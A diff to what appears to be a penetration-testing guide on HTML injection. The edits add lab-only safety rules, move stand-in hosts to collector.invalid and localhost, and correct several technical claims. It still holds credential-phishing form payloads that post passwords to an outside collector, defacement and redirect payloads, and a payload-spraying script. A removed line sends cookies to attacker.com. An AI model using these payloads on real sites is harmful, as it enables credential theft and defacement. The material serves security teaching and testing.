@@ -15,6 +15,8 @@ Identify and exploit HTML injection vulnerabilities that allow attackers to inje
 4. **Remediation Guidance** - Input validation recommendations
 
 
+Use a controlled lab and synthetic credentials for form demonstrations. Do not expose an injected form to real users or collect real passwords. Stored payloads require explicit cleanup verification. Reflection in response text is only a candidate: inspect parsed DOM, context and browser behavior; curl/grep cannot prove rendering or exploitability. Every automated request must stay within the exact authorized origin, bounded count/rate and response-size budget.
+
 ## Core Workflow
 
 ### Phase 1: Understanding HTML Injection
@@ -96,24 +98,24 @@ Test with simple HTML tags:
 <br><br><br>Line breaks
 
 <!-- Links -->
-<a href="http://attacker.com">Click Here</a>
-<a href="http://attacker.com">Legitimate Link</a>
+<a href="https://collector.invalid">Click Here</a>
+<a href="https://collector.invalid">Legitimate Link</a>
 
 <!-- Images -->
-<img src="http://attacker.com/image.png">
+<img src="https://collector.invalid/image.png">
 <img src="x" onerror="alert(1)">  <!-- XSS attempt -->
 ```
 
 Testing workflow:
 ```bash
 # Test basic injection
-curl "http://target.com/search?q=<h1>Test</h1>"
+curl --get --data-urlencode 'q=<h1>Test</h1>' "http://127.0.0.1:8000/search"
 
 # Check if HTML renders in response
-curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"
+curl --get --data-urlencode 'q=<b>Bold</b>' "http://127.0.0.1:8000/search" | grep -i "bold"
 
 # Test in URL-encoded form
-curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
+curl "http://127.0.0.1:8000/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
 ```
 
 ### Phase 4: Types of HTML Injection
@@ -127,12 +129,12 @@ Payload persists in database:
 Name: John Doe
 Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
      <h1>Site Under Maintenance</h1>
-     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
+     <p>Please login at <a href="https://collector.invalid/login">portal.company.com</a></p>
      </div>
 
 <!-- Comment injection -->
 Great article!
-<form action="http://attacker.com/steal" method="POST">
+<form action="https://collector.invalid/steal" method="POST">
     <input name="username" placeholder="Session expired. Enter username:">
     <input name="password" type="password" placeholder="Password:">
     <input type="submit" value="Login">
@@ -145,10 +147,10 @@ Payload in URL parameters:
 
 ```html
 <!-- URL injection -->
-http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">
+http://127.0.0.1:8000/welcome?name=<h1>Welcome%20Admin</h1><form%20action="https://collector.invalid/steal">
 
 <!-- Search result injection -->
-http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
+http://127.0.0.1:8000/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
 ```
 
 #### Reflected POST Injection
@@ -158,11 +160,11 @@ Payload in POST data:
 ```bash
 # POST injection test
 curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
-     http://target.com/submit
+     http://127.0.0.1:8000/submit
 
 # Form field injection
 curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
-     http://target.com/register
+     http://127.0.0.1:8000/register
 ```
 
 #### URL-Based Injection
@@ -171,10 +173,10 @@ Inject into displayed URLs:
 
 ```html
 <!-- If URL is displayed on page -->
-http://target.com/page/<h1>Injected</h1>
+http://127.0.0.1:8000/page/<h1>Injected</h1>
 
 <!-- Path-based injection -->
-http://target.com/users/<img src=x>/profile
+http://127.0.0.1:8000/users/<img src=x>/profile
 ```
 
 ### Phase 5: Phishing Attack Construction
@@ -187,7 +189,7 @@ Create convincing phishing forms:
             background:white;z-index:9999;padding:50px;">
     <h2>Session Expired</h2>
     <p>Your session has expired. Please log in again.</p>
-    <form action="http://attacker.com/capture" method="POST">
+    <form action="https://collector.invalid/capture" method="POST">
         <label>Username:</label><br>
         <input type="text" name="username" style="width:200px;"><br><br>
         <label>Password:</label><br>
@@ -196,11 +198,11 @@ Create convincing phishing forms:
     </form>
 </div>
 
-<!-- Hidden credential stealer -->
+<!-- Synthetic form submission demonstration; CSS URL alone cannot read typed values -->
 <style>
-    input { background: url('http://attacker.com/log?data=') }
+    input { background: url('https://collector.invalid/log?data=') }
 </style>
-<form action="http://attacker.com/steal" method="POST">
+<form action="https://collector.invalid/steal" method="POST">
     <input name="user" placeholder="Verify your username">
     <input name="pass" type="password" placeholder="Verify your password">
     <button>Verify</button>
@@ -209,7 +211,7 @@ Create convincing phishing forms:
 
 URL-encoded phishing link:
 ```
-http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
+http://127.0.0.1:8000/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
 ```
 
 ### Phase 6: Defacement Payloads
@@ -231,7 +233,7 @@ Website appearance manipulation:
 </body>
 
 <!-- Image injection -->
-<img src="http://attacker.com/defaced.jpg"
+<img src="https://collector.invalid/defaced.jpg"
      style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
 
 <!-- Marquee injection (visible movement) -->
@@ -247,22 +249,22 @@ Website appearance manipulation:
 ```html
 <!-- Style injection -->
 <style>
-    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
+    body { background: url('https://collector.invalid/static-marker') }
     .content { display: none }
     .fake-content { display: block }
 </style>
 
 <!-- Inline style injection -->
-<div style="background:url('http://attacker.com/log')">Content</div>
+<div style="background:url('https://collector.invalid/log')">Content</div>
 ```
 
 #### Meta Tag Injection
 
 ```html
 <!-- Redirect via meta refresh -->
-<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
+<meta http-equiv="refresh" content="0;url=https://collector.invalid/phish">
 
-<!-- CSP bypass attempt -->
+<!-- Adding a permissive meta policy cannot relax an existing header CSP -->
 <meta http-equiv="Content-Security-Policy" content="default-src *">
 ```
 
@@ -270,7 +272,7 @@ Website appearance manipulation:
 
 ```html
 <!-- Hijack existing form -->
-<form action="http://attacker.com/steal">
+<form action="https://collector.invalid/steal">
 
 <!-- If form already exists, add input -->
 <input type="hidden" name="extra" value="data">
@@ -281,10 +283,10 @@ Website appearance manipulation:
 
 ```html
 <!-- Embed external content -->
-<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>
+<iframe src="https://collector.invalid/malicious" width="100%" height="500"></iframe>
 
 <!-- Invisible tracking iframe -->
-<iframe src="http://attacker.com/track" style="display:none"></iframe>
+<iframe src="https://collector.invalid/track" style="display:none"></iframe>
 ```
 
 ### Phase 8: Bypass Techniques
@@ -348,7 +350,7 @@ Evade basic filters:
 import requests
 import urllib.parse
 
-target = "http://target.com/search"
+target = "http://127.0.0.1:8000/search"
 param = "q"
 
 payloads = [
@@ -356,10 +358,10 @@ payloads = [
     "<b>Bold</b>",
     "<script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
-    "<a href='http://evil.com'>Click</a>",
+    "<a href='https://collector.invalid'>Click</a>",
     "<div style='color:red'>Styled</div>",
     "<marquee>Moving</marquee>",
-    "<iframe src='http://evil.com'></iframe>",
+    "<iframe src='https://collector.invalid'></iframe>",
 ]
 
 for payload in payloads:
@@ -367,7 +369,7 @@ for payload in payloads:
     url = f"{target}?{param}={encoded}"
 
     try:
-        response = requests.get(url, timeout=5)
+        response = requests.get(url, timeout=5, allow_redirects=False)
         if payload.lower() in response.text.lower():
             print(f"[+] Possible injection: {payload}")
         elif "<h1>" in response.text or "<b>" in response.text:
@@ -384,11 +386,8 @@ Secure coding practices:
 // PHP: Escape output
 echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
 
-// PHP: Strip tags
-echo strip_tags($user_input);
-
-// PHP: Allow specific tags only
-echo strip_tags($user_input, '<p><b><i>');
+// strip_tags is not an XSS defense and allowed tags retain unsafe attributes.
+// For intended rich HTML, use a maintained HTML sanitizer with a restrictive policy.
 ```
 
 ```python
@@ -428,10 +427,10 @@ Server-side protections:
 |---------|---------|
 | `<h1>Test</h1>` | Basic rendering test |
 | `<b>Bold</b>` | Simple formatting |
-| `<a href="evil.com">Link</a>` | Link injection |
+| `<a href="collector.invalid">Link</a>` | Link injection |
 | `<img src=x>` | Image tag test |
 | `<div style="color:red">` | Style injection |
-| `<form action="evil.com">` | Form hijacking |
+| `<form action="collector.invalid">` | Form hijacking |
 
 ### Injection Contexts
 
@@ -452,6 +451,8 @@ Server-side protections:
 | Double encoding | `%253C` = `<` |
 | Unicode | `\u003c` = `<` |
 
+
+Encoding examples depend on the application decoding pipeline. CSS does not execute JavaScript concatenation, character references are not universally reparsed as markup, and split tag names are not equivalent to intact names. Treat examples as hypotheses, not guaranteed filter bypasses.
 
 ## Troubleshooting
 
